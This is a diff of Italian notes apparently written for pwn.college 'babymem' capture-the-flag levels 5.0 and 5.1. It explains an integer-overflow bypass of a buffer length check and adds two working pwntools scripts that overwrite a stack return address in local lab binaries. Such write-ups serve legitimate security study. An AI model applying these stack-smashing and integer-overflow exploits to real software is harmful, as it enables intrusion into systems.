@@ -119,7 +119,31 @@ Questo ci permette di capire che il return address sarà 8 byte dopo il primo se
 
 ## Livello 5.0
 
-+ Questo livello richiede di rompere ancora di più il controllo sulla lunghezza del buffer, facendogli fare una moltiplicazione tra numeri negativi, ma non sono riuscito ad andare avanti ricevendo sempre l'errore di bad address
++ Questo livello richiede di rompere ancora di più il controllo sulla lunghezza del buffer, facendogli fare una moltiplicazione su numeri unsigned nella moltiplicazione a due, ma non ho capito per quale stracazzo di motivo dovrebbe funzionare.  
+Il primo tentativo riuscito l'ho fatto compilando con ipython, però funziona anche runnando questo script all'interno di un file python e eseguendolo con il comando ```py python3 programma_python```  
+Altra considerazione: Questo metodo non necessità del byte in più solito, ma bisogna premurarsi di coprire tutti i byte dell'ultima riga dello stack, altrimenti verrà letto come indirizzo di ritorno anche il valore decimale 0a che indica la terminazione di riga
+
+    ```py
+    import pwn
+    r = pwn.process("/challenge/babymem_level5.0")
+    r.sendline(b"2")
+    r.sendline(b"2147483648")       #per calcolarlo apri python e calcola 2**31
+    r.sendline(b'\x90' * 144 + b'\x90'*8 + b'\x67\x17\x40\x00\x00\x00\x00\x00')
+    print(r.readall().decode("utf-8"))
+    ```
+
+## Livello 5.1
+
++ Questo è il livello al buio del 5.0, e lo si risolve usando il suo modo particolare e andando a cercare il return address con objdump e il segmentation fault. In questo caso bisogna però guardare il segnale di uscita del processo e non l'output finale del programma. Anche qua non serve il bit aggiuntivo.
+
+    ```py
+    import pwn
+    r = pwn.process("/challenge/babymem_level5.1")
+    r.sendline(b"2")
+    r.sendline(b"2147483648")
+    r.sendline(b'\x90' * 96 + b'\x90'*8 + b'\xef\x17\x40\x00\x00\x00\x00\x00')
+    print(r.readall().decode("utf-8"))
+    ```
 
 ## Livello 6.0
 
